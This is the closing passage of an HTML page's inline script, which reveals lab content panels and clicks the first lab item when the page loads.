                if (labContent) {
                    labContent.classList.remove('hidden');
                }
            });
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', () => {
            const firstLab = document.querySelector('.lab-item');
            if (firstLab) firstLab.click();
        });
    </script>
</body>
</html>
